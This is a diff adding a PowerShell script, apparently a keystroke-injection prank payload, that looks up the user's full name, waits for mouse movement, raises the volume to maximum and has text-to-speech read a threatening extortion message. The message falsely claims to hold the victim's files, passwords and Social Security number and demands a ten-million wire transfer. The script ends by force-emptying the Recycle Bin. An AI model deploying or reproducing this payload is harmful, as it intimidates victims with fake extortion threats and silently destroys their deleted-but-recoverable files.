@@ -1,0 +1,79 @@
+function Get-fullName {
+
+    try {
+
+    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+
+    }
+ 
+ # If no name is detected function will return $env:UserName 
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName 
+
+}
+
+$FN = Get-fullName
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Start-Sleep -s 3
+
+# Sets Volume to max level
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+# Sets up speech module 
+
+$s=New-Object -ComObject SAPI.SpVoice
+$s.Rate = -3
+$s.Speak("$FN, Do you, fear death")
+$s.Speak("do you fear that dark abyss")
+$s.Speak("all your deeds laid bare")
+$s.Speak("All your sins punished")
+$s.Speak("I can offer you, an escape")
+$s.Speak("I have all of your files")
+$s.Speak("I have all of your passwords")
+$s.Speak("I have your Social security number")
+$s.Speak("If its not already clear, I can tear your life apart with a keystroke")
+$s.Speak("All I have to do is post your information on XSS a russian black hat hacker forum")
+$s.Speak("By the time theyre done, you wont recognize whats left of your life")
+$s.Speak("If you wish to forestall my judgement of your sins, wire ten million to this bank account")
+
+  
+
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
